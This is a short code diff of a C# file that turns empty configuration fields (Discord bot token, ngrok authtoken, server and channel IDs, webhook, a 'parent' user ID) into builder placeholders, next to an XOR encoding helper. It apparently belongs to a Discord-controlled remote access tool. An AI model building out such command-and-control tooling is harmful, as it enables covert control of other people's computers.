@@ -26,12 +26,12 @@ namespace s1l14lx3
         //end
 
         //User Config
-        public static string GUILDID = "";            //discord server ID
-        public static string MainChannelID = "";      //discord server main channel ID
-        public static string MainChannelWebhook = ""; //Main channel Webhook
-        public static string DISCORDTOKEN = "";       //discord bot token
-        public static string PARENTUSERID = "";       //Your discord ID
-        public static string NGROKTOKEN = "";         //ngrok authtoken
+        public static string DISCORDTOKEN = "{DISCORDTOKEN}";             //discord bot token
+        public static string NGROKTOKEN = "{NGROKAUTHTOKEN}";             //ngrok authtoken
+        public static string GUILDID = "{GUILDID}";                       //discord server ID
+        public static string MainChannelID = "{MAINCHANNELID}";           //discord server main channel ID
+        public static string MainChannelWebhook = "{MAINCHANNELWEBHOOK}"; //Main channel Webhook
+        public static string PARENTUSERID = "{DISCORDID}";                //Your discord ID
         //end
     }
     public class Tools
@@ -44,7 +44,7 @@ namespace s1l14lx3
                 e.Cancel = true;
                 manualResetEventSlim.Set();
             };
-            manualResetEventSlim.Wait();
+            manualResetEventSlim.Wait();    
         }
         public static string XOREncode(string rawData, byte key)
         {
